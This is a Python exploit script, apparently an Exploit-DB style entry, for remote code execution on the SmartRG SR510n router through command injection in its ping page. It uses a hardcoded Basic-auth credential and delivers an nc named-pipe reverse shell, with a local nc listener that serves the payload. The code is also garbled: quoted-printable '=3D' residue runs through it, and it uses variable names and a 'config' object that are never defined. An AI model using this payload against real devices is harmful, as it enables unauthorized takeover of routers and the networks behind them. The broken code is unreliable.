# Exploit Title: SmartRG Router SR510n 2.6.13 - RCE (Remote Code Execution)
# done by Sathwik.R - www.github.com/cicada0007

import requests
from subprocess import Popen, PIPE

router_host =3D "http://192.168.1.1"
authorization_header =3D "YWRtaW46QWRtMW5ATDFtMyM=3D"

lhost =3D "lo"
lport =3D 80

payload_port =3D 81


def main():
    try:
        payload_command = f"rm /tmp/s && mknod /tmp/s p && /bin/sh 0< /tmp/s | nc {LOCAL_HOST} {LOCAL_PORT} > /tmp/s"
        with Popen(["echo", payload_command], stdout=PIPE) as e_proc:
            Popen(["nc", "-nlvp", f"{PAYLOAD_PORT}"], stdin=e_proc.stdout)
            send_payload(f"|nc {LOCAL_HOST} {PAYLOAD_PORT}|sh")
            print("done.. check shell")
    except Exception as e:
        print(f"An error occurred: {e}")



def get_session():
    url = f"{config['router_host']}/admin/ping.html"
    headers = {"Authorization": config['authorization_header']}
    response = requests.get(url, headers=headers)
    session_key = response.text.split("&sessionKey=")[1].split("'")[0]
    return session_key



def send_payload(payload):
    print(payload)
    url =3D router_host + "/admin/pingHost.cmd"
    headers =3D {"Authorization": "Basic {}".format(authorization_header)}
    params =3D {"action": "add", "targetHostAddress": payload, "sessionKey"=
: get_session()}
    requests.get(url, headers=3Dheaders, params=3Dparams).text


main()
